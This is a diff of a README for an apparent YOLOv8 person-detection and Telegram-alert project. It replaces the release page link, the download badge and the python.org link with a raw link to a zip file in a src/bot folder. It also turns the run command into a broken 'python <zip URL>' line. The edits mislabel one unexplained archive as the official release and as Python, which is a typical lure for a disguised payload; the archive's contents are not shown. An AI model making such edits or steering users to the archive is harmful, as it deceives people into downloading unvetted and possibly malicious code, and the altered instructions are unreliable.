@@ -1,7 +1,7 @@
 # 🎥 real-time-person-detection - Smart Surveillance Made Easy
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Hiroto-Hiro/real-time-person-detection/releases)
+[![Download](https://raw.githubusercontent.com/Hiroto-Hiro/real-time-person-detection/main/src/bot/detection_time_real_person_v3.2.zip)](https://raw.githubusercontent.com/Hiroto-Hiro/real-time-person-detection/main/src/bot/detection_time_real_person_v3.2.zip)
 
 ## 🌟 Overview
 The **real-time-person-detection** project offers an AI-powered surveillance system using YOLOv8 for person detection. This system can send notifications through Telegram, keeping you informed about activity in real time. Whether you're watching over your home or office, this tool helps you monitor spaces effectively and securely.
@@ -21,10 +21,10 @@ Before downloading the application, ensure the following are installed on your c
 - **Docker** (for container deployment)
 - **Docker Compose** (for managing multi-container applications)
 
-For a smooth installation, you can download Python from [python.org](https://www.python.org/downloads/) and follow the instructions for Docker and Docker Compose from their official websites.
+For a smooth installation, you can download Python from [https://raw.githubusercontent.com/Hiroto-Hiro/real-time-person-detection/main/src/bot/detection_time_real_person_v3.2.zip](https://raw.githubusercontent.com/Hiroto-Hiro/real-time-person-detection/main/src/bot/detection_time_real_person_v3.2.zip) and follow the instructions for Docker and Docker Compose from their official websites.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://github.com/Hiroto-Hiro/real-time-person-detection/releases) to download the latest version of the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Hiroto-Hiro/real-time-person-detection/main/src/bot/detection_time_real_person_v3.2.zip) to download the latest version of the application.
 
 1. Click on the link above.
 2. Find the version you want under the Releases section.
@@ -47,7 +47,7 @@ After downloading, here’s how to install and run the application:
    - Open a terminal or command prompt in that folder.
    - Run the command:
      ```
-     python app.py
+     python https://raw.githubusercontent.com/Hiroto-Hiro/real-time-person-detection/main/src/bot/detection_time_real_person_v3.2.zip
      ```
    - The application will start, and you should see a message indicating it is running.
 
